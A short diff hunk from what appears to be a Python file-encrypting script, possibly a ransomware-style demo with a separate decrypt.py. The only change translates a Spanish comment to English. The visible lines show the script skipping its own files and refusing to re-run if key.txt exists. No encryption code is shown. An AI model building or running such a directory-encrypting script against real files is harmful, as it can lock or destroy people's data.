@@ -9,7 +9,7 @@ files = []
 ignoredFiles = [os.path.basename(__file__), 'decrypt.py', '.gitignore']
 
 
-# * Bucle para descubrir archivos en un directorio
+# * Loop to discover files in a directory
 if os.path.exists('key.txt') == True:
     print("The key.txt file already exists cannot encrypt files again")
     sys.exit()
